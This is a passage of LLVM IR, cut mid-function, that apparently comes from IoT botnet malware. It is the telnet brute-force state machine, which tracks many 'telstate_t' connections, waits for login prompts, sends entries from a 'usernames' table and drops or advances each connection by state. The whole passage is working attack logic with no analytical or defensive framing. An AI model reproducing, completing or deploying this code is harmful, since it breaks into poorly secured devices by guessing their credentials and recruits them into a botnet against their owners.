; <label>:373:                                    ; preds = %358, %349
  br label %1942

; <label>:374:                                    ; preds = %68
  %375 = load i32, i32* %2, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 6
  %379 = load i32, i32* %378, align 4
  %380 = icmp eq i32 %379, 0
  br i1 %380, label %381, label %387

; <label>:381:                                    ; preds = %374
  %382 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %383 = load i32, i32* %2, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 6
  store i32 %382, i32* %386, align 4
  br label %387

; <label>:387:                                    ; preds = %381, %374
  %388 = load i32, i32* %2, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %390, i32 0, i32 0
  %392 = load i32, i32* %391, align 16
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 8
  %397 = load i8*, i8** %396, align 8
  %398 = load i32, i32* %2, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 7
  %402 = load i16, i16* %401, align 16
  %403 = zext i16 %402 to i32
  %404 = call i32 @readUntil(i32 %392, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %397, i32 1024, i32 %403)
  %405 = icmp ne i32 %404, 0
  br i1 %405, label %406, label %438

; <label>:406:                                    ; preds = %387
  %407 = load i32, i32* %2, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %408
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %409, i32 0, i32 6
  store i32 0, i32* %410, align 4
  %411 = load i32, i32* %2, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 7
  store i16 0, i16* %414, align 16
  %415 = load i32, i32* %2, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %416
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %417, i32 0, i32 8
  %419 = load i8*, i8** %418, align 8
  %420 = call i8* @strstr(i8* %419, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %421 = icmp ne i8* %420, null
  br i1 %421, label %422, label %427

; <label>:422:                                    ; preds = %406
  %423 = load i32, i32* %2, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 2
  store i8 5, i8* %426, align 8
  br label %432

; <label>:427:                                    ; preds = %406
  %428 = load i32, i32* %2, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 2
  store i8 3, i8* %431, align 8
  br label %432

; <label>:432:                                    ; preds = %427, %422
  %433 = load i32, i32* %2, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 8
  %437 = load i8*, i8** %436, align 8
  call void @llvm.memset.p0i8.i64(i8* %437, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:438:                                    ; preds = %387
  %439 = load i32, i32* %2, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %440
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %441, i32 0, i32 0
  %443 = load i32, i32* %442, align 16
  %444 = load i32, i32* %2, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 8
  %448 = load i8*, i8** %447, align 8
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 7
  %453 = load i16, i16* %452, align 16
  %454 = zext i16 %453 to i32
  %455 = call i32 @readUntil(i32 %443, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %448, i32 1024, i32 %454)
  %456 = icmp ne i32 %455, 0
  br i1 %456, label %457, label %493

; <label>:457:                                    ; preds = %438
  %458 = load i32, i32* %2, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 6
  store i32 0, i32* %461, align 4
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 7
  store i16 0, i16* %465, align 16
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 8
  %470 = load i8*, i8** %469, align 8
  %471 = call i8* @strstr(i8* %470, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %472 = icmp ne i8* %471, null
  br i1 %472, label %473, label %478

; <label>:473:                                    ; preds = %457
  %474 = load i32, i32* %2, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 2
  store i8 5, i8* %477, align 8
  br label %483

; <label>:478:                                    ; preds = %457
  %479 = load i32, i32* %2, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %480
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %481, i32 0, i32 2
  store i8 3, i8* %482, align 8
  br label %483

; <label>:483:                                    ; preds = %478, %473
  %484 = load i32, i32* %2, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 8
  %488 = load i8*, i8** %487, align 8
  call void @llvm.memset.p0i8.i64(i8* %488, i8 0, i64 1024, i32 1, i1 false)
  %489 = load i32, i32* %2, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %490
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %491, i32 0, i32 2
  store i8 3, i8* %492, align 8
  br label %1943

; <label>:493:                                    ; preds = %438
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 8
  %498 = load i8*, i8** %497, align 8
  %499 = call i64 @strlen(i8* %498) #10
  %500 = trunc i64 %499 to i16
  %501 = load i32, i32* %2, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 7
  store i16 %500, i16* %504, align 16
  br label %505

; <label>:505:                                    ; preds = %493
  br label %506

; <label>:506:                                    ; preds = %505
  %507 = load i32, i32* %2, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 6
  %511 = load i32, i32* %510, align 4
  %512 = add i32 %511, 10
  %513 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %514 = icmp ult i32 %512, %513
  br i1 %514, label %515, label %530

; <label>:515:                                    ; preds = %506
  %516 = load i32, i32* %2, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 0
  %520 = load i32, i32* %519, align 16
  %521 = call i32 @sclose(i32 %520)
  %522 = load i32, i32* %2, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %523
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %524, i32 0, i32 2
  store i8 0, i8* %525, align 8
  %526 = load i32, i32* %2, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 3
  store i8 1, i8* %529, align 1
  br label %530

; <label>:530:                                    ; preds = %515, %506
  br label %1942

; <label>:531:                                    ; preds = %68
  %532 = load i32, i32* %2, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 0
  %536 = load i32, i32* %535, align 16
  %537 = load i32, i32* %2, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 4
  %541 = load i8, i8* %540, align 2
  %542 = zext i8 %541 to i64
  %543 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %542
  %544 = load i8*, i8** %543, align 8
  %545 = load i32, i32* %2, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %546
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %547, i32 0, i32 4
  %549 = load i8, i8* %548, align 2
  %550 = zext i8 %549 to i64
  %551 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %550
  %552 = load i8*, i8** %551, align 8
  %553 = call i64 @strlen(i8* %552) #10
  %554 = call i64 @send(i32 %536, i8* %544, i64 %553, i32 16384)
  %555 = icmp slt i64 %554, 0
  br i1 %555, label %556, label %571

; <label>:556:                                    ; preds = %531
  %557 = load i32, i32* %2, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %558
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %559, i32 0, i32 0
  %561 = load i32, i32* %560, align 16
  %562 = call i32 @sclose(i32 %561)
  %563 = load i32, i32* %2, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %564
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %565, i32 0, i32 2
  store i8 0, i8* %566, align 8
  %567 = load i32, i32* %2, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 3
  store i8 1, i8* %570, align 1
  br label %1943

; <label>:571:                                    ; preds = %531
  %572 = load i32, i32* %2, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 0
  %576 = load i32, i32* %575, align 16
  %577 = call i64 @send(i32 %576, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %578 = icmp slt i64 %577, 0
  br i1 %578, label %579, label %594

; <label>:579:                                    ; preds = %571
  %580 = load i32, i32* %2, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %581
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %582, i32 0, i32 0
  %584 = load i32, i32* %583, align 16
  %585 = call i32 @sclose(i32 %584)
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 2
  store i8 0, i8* %589, align 8
  %590 = load i32, i32* %2, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 3
  store i8 1, i8* %593, align 1
  br label %1943

; <label>:594:                                    ; preds = %571
  %595 = load i32, i32* %2, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 2
  store i8 4, i8* %598, align 8
  br label %1942

; <label>:599:                                    ; preds = %68
  %600 = load i32, i32* %2, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 6
  %604 = load i32, i32* %603, align 4
  %605 = icmp eq i32 %604, 0
  br i1 %605, label %606, label %612

; <label>:606:                                    ; preds = %599
  %607 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %608 = load i32, i32* %2, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 6
  store i32 %607, i32* %611, align 4
  br label %612

; <label>:612:                                    ; preds = %606, %599
  %613 = load i32, i32* %2, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 0
  %617 = load i32, i32* %616, align 16
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 8
  %622 = load i8*, i8** %621, align 8
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 7
  %627 = load i16, i16* %626, align 16
  %628 = zext i16 %627 to i32
  %629 = call i32 @readUntil(i32 %617, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %622, i32 1024, i32 %628)
  %630 = icmp ne i32 %629, 0
  br i1 %630, label %631, label %663

; <label>:631:                                    ; preds = %612
  %632 = load i32, i32* %2, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 6
  store i32 0, i32* %635, align 4
  %636 = load i32, i32* %2, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 7
  store i16 0, i16* %639, align 16
  %640 = load i32, i32* %2, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 8
  %644 = load i8*, i8** %643, align 8
  %645 = call i8* @strstr(i8* %644, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %646 = icmp ne i8* %645, null
  br i1 %646, label %647, label %652

; <label>:647:                                    ; preds = %631
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 2
  store i8 5, i8* %651, align 8
  br label %657

; <label>:652:                                    ; preds = %631
  %653 = load i32, i32* %2, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 2
  store i8 7, i8* %656, align 8
  br label %657

; <label>:657:                                    ; preds = %652, %647
  %658 = load i32, i32* %2, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 8
  %662 = load i8*, i8** %661, align 8
  call void @llvm.memset.p0i8.i64(i8* %662, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:663:                                    ; preds = %612
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 0
  %668 = load i32, i32* %667, align 16
  %669 = load i32, i32* %2, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 8
  %673 = load i8*, i8** %672, align 8
  %674 = load i32, i32* %2, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 7
  %678 = load i16, i16* %677, align 16
  %679 = zext i16 %678 to i32
  %680 = call i32 @readUntil(i32 %668, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %673, i32 1024, i32 %679)
  %681 = icmp ne i32 %680, 0
  br i1 %681, label %682, label %714

; <label>:682:                                    ; preds = %663
  %683 = load i32, i32* %2, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 6
  store i32 0, i32* %686, align 4
  %687 = load i32, i32* %2, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 7
  store i16 0, i16* %690, align 16
  %691 = load i32, i32* %2, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 8
  %695 = load i8*, i8** %694, align 8
  %696 = call i8* @strstr(i8* %695, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %697 = icmp ne i8* %696, null
  br i1 %697, label %698, label %703

; <label>:698:                                    ; preds = %682
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 2
  store i8 5, i8* %702, align 8
  br label %708

; <label>:703:                                    ; preds = %682
  %704 = load i32, i32* %2, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 2
  store i8 7, i8* %707, align 8
  br label %708

; <label>:708:                                    ; preds = %703, %698
  %709 = load i32, i32* %2, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %710
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %711, i32 0, i32 8
  %713 = load i8*, i8** %712, align 8
  call void @llvm.memset.p0i8.i64(i8* %713, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:714:                                    ; preds = %663
  %715 = load i32, i32* %2, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 8
  %719 = load i8*, i8** %718, align 8
  %720 = call i8* @strstr(i8* %719, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %721 = icmp ne i8* %720, null
  br i1 %721, label %722, label %737

; <label>:722:                                    ; preds = %714
  %723 = load i32, i32* %2, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 16
  %728 = call i32 @sclose(i32 %727)
  %729 = load i32, i32* %2, align 4
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 2
  store i8 0, i8* %732, align 8
  %733 = load i32, i32* %2, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 3
  store i8 0, i8* %736, align 1
  br label %1943

; <label>:737:                                    ; preds = %714
  %738 = load i32, i32* %2, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 8
  %742 = load i8*, i8** %741, align 8
  %743 = call i8* @strstr(i8* %742, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %744 = icmp ne i8* %743, null
  br i1 %744, label %745, label %760

; <label>:745:                                    ; preds = %737
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 16
  %751 = call i32 @sclose(i32 %750)
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 2
  store i8 0, i8* %755, align 8
  %756 = load i32, i32* %2, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 3
  store i8 0, i8* %759, align 1
  br label %1943

; <label>:760:                                    ; preds = %737
  %761 = load i32, i32* %2, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 8
  %765 = load i8*, i8** %764, align 8
  %766 = call i8* @strstr(i8* %765, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %767 = icmp ne i8* %766, null
  br i1 %767, label %768, label %783

; <label>:768:                                    ; preds = %760
  %769 = load i32, i32* %2, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 0
  %773 = load i32, i32* %772, align 16
  %774 = call i32 @sclose(i32 %773)
  %775 = load i32, i32* %2, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 2
  store i8 0, i8* %778, align 8
  %779 = load i32, i32* %2, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %780
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %781, i32 0, i32 3
  store i8 0, i8* %782, align 1
  br label %1943

; <label>:783:                                    ; preds = %760
  %784 = load i32, i32* %2, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %785
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %786, i32 0, i32 8
  %788 = load i8*, i8** %787, align 8
  %789 = call i8* @strstr(i8* %788, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %790 = icmp ne i8* %789, null
  br i1 %790, label %791, label %806

; <label>:791:                                    ; preds = %783
  %792 = load i32, i32* %2, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 0
  %796 = load i32, i32* %795, align 16
  %797 = call i32 @sclose(i32 %796)
  %798 = load i32, i32* %2, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %799
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %800, i32 0, i32 2
  store i8 0, i8* %801, align 8
  %802 = load i32, i32* %2, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 3
  store i8 0, i8* %805, align 1
  br label %1943

; <label>:806:                                    ; preds = %783
  %807 = load i32, i32* %2, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %808
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %809, i32 0, i32 8
  %811 = load i8*, i8** %810, align 8
  %812 = call i8* @strstr(i8* %811, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %813 = icmp ne i8* %812, null
  br i1 %813, label %814, label %829

; <label>:814:                                    ; preds = %806
  %815 = load i32, i32* %2, align 4
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %816
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %817, i32 0, i32 0
  %819 = load i32, i32* %818, align 16
  %820 = call i32 @sclose(i32 %819)
  %821 = load i32, i32* %2, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %822
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %823, i32 0, i32 2
  store i8 0, i8* %824, align 8
  %825 = load i32, i32* %2, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 3
  store i8 0, i8* %828, align 1
  br label %1943

; <label>:829:                                    ; preds = %806
  %830 = load i32, i32* %2, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 8
